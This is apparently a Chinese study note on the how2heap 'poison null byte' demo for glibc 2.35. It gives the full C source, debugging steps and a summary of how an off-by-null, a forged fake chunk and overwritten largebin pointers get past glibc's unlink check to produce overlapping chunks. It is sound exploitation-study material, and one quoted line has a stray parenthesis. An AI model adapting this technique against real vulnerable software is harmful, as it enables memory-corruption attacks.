# 源码
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

int main()
{
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	puts("Welcome to poison null byte!");
	puts("Tested in Ubuntu 20.04 64bit.");
	puts("This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.");

	puts("Some of the implementation details are borrowed from https://github.com/StarCross-Tech/heap_exploit_2.31/blob/master/off_by_null.c\n");

	// step1: allocate padding
	puts("Step1: allocate a large padding so that the fake chunk's addresses's lowest 2nd byte is \\x00");
	void *tmp = malloc(0x1);
	void *heap_base = (void *)((long)tmp & (~0xfff));
	printf("heap address: %p\n", heap_base);
	size_t size = 0x10000 - ((long)tmp&0xffff) - 0x20;
	printf("Calculate padding chunk size: 0x%lx\n", size);
	puts("Allocate the padding. This is required to avoid a 4-bit bruteforce because we are going to overwrite least significant two bytes.");
	void *padding= malloc(size);

	// step2: allocate prev chunk and victim chunk
	puts("\nStep2: allocate two chunks adjacent to each other.");
	puts("Let's call the first one 'prev' and the second one 'victim'.");
	void *prev = malloc(0x500);
	void *victim = malloc(0x4f0);
	puts("malloc(0x10) to avoid consolidation");
	malloc(0x10);
	printf("prev chunk: malloc(0x500) = %p\n", prev);
	printf("victim chunk: malloc(0x4f0) = %p\n", victim);

	// step3: link prev into largebin
	puts("\nStep3: Link prev into largebin");
	puts("This step is necessary for us to forge a fake chunk later");
	puts("The fd_nextsize of prev and bk_nextsize of prev will be the fd and bck pointers of the fake chunk");
	puts("allocate a chunk 'a' with size a little bit smaller than prev's");
	void *a = malloc(0x4f0);
	printf("a: malloc(0x4f0) = %p\n", a);
	puts("malloc(0x10) to avoid consolidation");
	malloc(0x10);
	puts("allocate a chunk 'b' with size a little bit larger than prev's");
	void *b = malloc(0x510);
	printf("b: malloc(0x510) = %p\n", b);
	puts("malloc(0x10) to avoid consolidation");
	malloc(0x10);

	puts("\nCurrent Heap Layout\n"
		 "    ... ...\n"
		 "padding\n"
		 "    prev Chunk(addr=0x??0010, size=0x510)\n"
     	 "  victim Chunk(addr=0x??0520, size=0x500)\n"
		 " barrier Chunk(addr=0x??0a20, size=0x20)\n"
		 "       a Chunk(addr=0x??0a40, size=0x500)\n"
		 " barrier Chunk(addr=0x??0f40, size=0x20)\n"
		 "       b Chunk(addr=0x??0f60, size=0x520)\n"
		 " barrier Chunk(addr=0x??1480, size=0x20)\n");

	puts("Now free a, b, prev");
	free(a);
	free(b);
	free(prev);
	puts("current unsorted_bin:  header <-> [prev, size=0x510] <-> [b, size=0x520] <-> [a, size=0x500]\n");

	puts("Allocate a huge chunk to enable sorting");
	malloc(0x1000);
	puts("current large_bin:  header <-> [b, size=0x520] <-> [prev, size=0x510] <-> [a, size=0x500]\n");

	puts("This will add a, b and prev to largebin\nNow prev is in largebin");
	printf("The fd_nextsize of prev points to a: %p\n", ((void **)prev)[2]+0x10);
	printf("The bk_nextsize of prev points to b: %p\n", ((void **)prev)[3]+0x10);

	// step4: allocate prev again to construct fake chunk
	puts("\nStep4: Allocate prev again to construct the fake chunk");
	puts("Since large chunk is sorted by size and a's size is smaller than prev's,");
	puts("we can allocate 0x500 as before to take prev out");
	void *prev2 = malloc(0x500);
	printf("prev2: malloc(0x500) = %p\n", prev2);
	puts("Now prev2 == prev, prev2->fd == prev2->fd_nextsize == a, and prev2->bk == prev2->bk_nextsize == b");
	assert(prev == prev2);

	puts("The fake chunk is contained in prev and the size is smaller than prev's size by 0x10");
	puts("So set its size to 0x501 (0x510-0x10 | flag)");
	((long *)prev)[1] = 0x501;
	puts("And set its prev_size(next_chunk) to 0x500 to bypass the size==prev_size(next_chunk) check");
	*(long *)(prev + 0x500) = 0x500;
	printf("The fake chunk should be at: %p\n", prev + 0x10);
	puts("use prev's fd_nextsize & bk_nextsize as fake_chunk's fd & bk");
	puts("Now we have fake_chunk->fd == a and fake_chunk->bk == b");

	// step5: bypass unlinking
	puts("\nStep5: Manipulate residual pointers to bypass unlinking later.");
	puts("Take b out first by allocating 0x510");
	void *b2 = malloc(0x510);
	printf("Because of the residual pointers in b, b->fd points to a right now: %p\n", ((void **)b2)[0]+0x10);
	printf("We can overwrite the least significant two bytes to make it our fake chunk.\n"
			"If the lowest 2nd byte is not \\x00, we need to guess what to write now\n");
	((char*)b2)[0] = '\x10';
	((char*)b2)[1] = '\x00';  // b->fd <- fake_chunk
	printf("After the overwrite, b->fd is: %p, which is the chunk pointer to our fake chunk\n", ((void **)b2)[0]);

	puts("To do the same to a, we can move it to unsorted bin first"
			"by taking it out from largebin and free it into unsortedbin");
	void *a2 = malloc(0x4f0);
	free(a2);
	puts("Now free victim into unsortedbin so that a->bck points to victim");
	free(victim);
	printf("a->bck: %p, victim: %p\n", ((void **)a)[1], victim);
	puts("Again, we take a out and overwrite a->bck to fake chunk");
	void *a3 = malloc(0x4f0);
	((char*)a3)[8] = '\x10';
	((char*)a3)[9] = '\x00';
	printf("After the overwrite, a->bck is: %p, which is the chunk pointer to our fake chunk\n", ((void **)a3)[1]);
	// pass unlink_chunk in malloc.c:
	//      mchunkptr fd = p->fd;
	//      mchunkptr bk = p->bk;
	//      if (__builtin_expect (fd->bk != p || bk->fd != p, 0))
	//          malloc_printerr ("corrupted double-linked list");
	puts("And we have:\n"
		 "fake_chunk->fd->bk == a->bk == fake_chunk\n"
		 "fake_chunk->bk->fd == b->fd == fake_chunk\n"
		 );

	// step6: add fake chunk into unsorted bin by off-by-null
	puts("\nStep6: Use backward consolidation to add fake chunk into unsortedbin");
	puts("Take victim out from unsortedbin");
	void *victim2 = malloc(0x4f0);
	printf("%p\n", victim2);
	puts("off-by-null into the size of vicim");
	/* VULNERABILITY */
	((char *)victim2)[-8] = '\x00';
	/* VULNERABILITY */

	puts("Now if we free victim, libc will think the fake chunk is a free chunk above victim\n"
			"It will try to backward consolidate victim with our fake chunk by unlinking the fake chunk then\n"
			"add the merged chunk into unsortedbin."
			);
	printf("For our fake chunk, because of what we did in step4,\n"
			"now P->fd->bk(%p) == P(%p), P->bk->fd(%p) == P(%p)\n"
			"so the unlink will succeed\n", ((void **)a3)[1], prev, ((void **)b2)[0], prev);
	free(victim);
	puts("After freeing the victim, the new merged chunk is added to unsorted bin"
			"And it is overlapped with the prev chunk");

	// step7: validate the chunk overlapping
	puts("Now let's validate the chunk overlapping");
	void *merged = malloc(0x100);
	printf("merged: malloc(0x100) = %p\n", merged);
	memset(merged, 'A', 0x80);
	printf("Now merged's content: %s\n", (char *)merged);

	puts("Overwrite prev's content");
	memset(prev2, 'C', 0x80);
	printf("merged's content has changed to: %s\n", (char *)merged);

	assert(strstr(merged, "CCCCCCCCC"));
}
```
该样例通过off by null修改标志位，同时伪造chunk和largebin链表绕过保护，获取一个悬垂指针，是很多攻击的起始。
# 调试过程
```
void *tmp = malloc(0x1);
void *padding= malloc(0x3d41);  //使下一个chunk的起始地址低2bytes为\x00

void *prev = malloc(0x500);
void *victim = malloc(0x4f0);
malloc(0x10);

void *a = malloc(0x4f0);
malloc(0x10);
void *b = malloc(0x510);
malloc(0x10);
```
![[notes/pwn/堆利用/how2heap源码分析/2.35/poison_null_byte/图/屏幕截图 2026-02-13 142239.png]]
```
    free(a);
    free(b);
    free(prev);
```
![[notes/pwn/堆利用/how2heap源码分析/2.35/poison_null_byte/图/屏幕截图 2026-02-13 142415.png]]
![[notes/pwn/堆利用/how2heap源码分析/2.35/poison_null_byte/图/屏幕截图 2026-02-13 142427.png]]
```
malloc(0x1000);  //触发consolidation
```
![[notes/pwn/堆利用/how2heap源码分析/2.35/poison_null_byte/图/屏幕截图 2026-02-13 142557.png]]
```
void *prev2 = malloc(0x500);
```
![[notes/pwn/堆利用/how2heap源码分析/2.35/poison_null_byte/图/屏幕截图 2026-02-13 143656.png]]
```
((long *)prev)[1] = 0x501;
*(long *)(prev + 0x500) = 0x500;
```
![[notes/pwn/堆利用/how2heap源码分析/2.35/poison_null_byte/图/屏幕截图 2026-02-13 143735.png]]
![[notes/pwn/堆利用/how2heap源码分析/2.35/poison_null_byte/图/屏幕截图 2026-02-13 145508.png]]
```
    void *b2 = malloc(0x510);
    ((char*)b2)[0] = '\x10';
    ((char*)b2)[1] = '\x00';
```
![[notes/pwn/堆利用/how2heap源码分析/2.35/poison_null_byte/图/屏幕截图 2026-02-13 161434.png]]
```
    void *a2 = malloc(0x4f0);
    free(a2);
    free(victim);
```
![[notes/pwn/堆利用/how2heap源码分析/2.35/poison_null_byte/图/屏幕截图 2026-02-13 161704.png]]
```
    void *a3 = malloc(0x4f0);
    ((char*)a3)[8] = '\x10';
    ((char*)a3)[9] = '\x00';
    // pass unlink_chunk in malloc.c:
    //      mchunkptr fd = p->fd;
    //      mchunkptr bk = p->bk;
    //      if (__builtin_expect (fd->bk != p || bk->fd != p, 0))
    //          malloc_printerr ("corrupted double-linked list");
```
这里如果能泄露堆地址，可以直接算偏移覆写；如果不能，则需要如上操作通过glibc获取bk和fd指针的高位，暴力爆破堆基地址的第二低byte位（虽有ASLR保护，只能纯碰，但概率很大）。
	覆盖a时由于只校验bk指针位置，fd指针位置可直接填padding。

```
void *victim2 = malloc(0x4f0);
//off by null
((char *)victim2)[-8] = '\x00';

free(victim);   //触发consolidation()
```
到这里，就可以直接malloc切unsortedbin，获得悬垂指针了。
![[屏幕截图 2026-02-13 161704.png]]
```
void *merged = malloc(0x100);
assert(prev2 == merged));
```

# 攻击逻辑
通过off by null覆盖inuse位，free触发consolidation，同时利用nextsize按chunk size大小排序的规则伪造链表，和链表指向chunk（可同时利用fd，bk指针获取高位堆地址）绕过对fd、bk链表指针的一致性检测，获得悬垂指针。
# 攻击流程
1. 有off by null。
2. malloc并伪造如下chunk
	![[notes/pwn/堆利用/how2heap源码分析/2.35/poison_null_byte/图/屏幕截图 2026-02-13 145508.png]]
3. 将fake chunk的fd、bk指针指向的chunk的fd，bk指针覆写fake chunk的地址，绕过检测（不能泄露堆地址的情况下，考虑*攻击逻辑*部分演示的通过glibc的`link()`函数获取高位堆地址，暴力爆破第二低位byte的方式，进行攻击）
4. `free(fake chunk的后一个chunk）`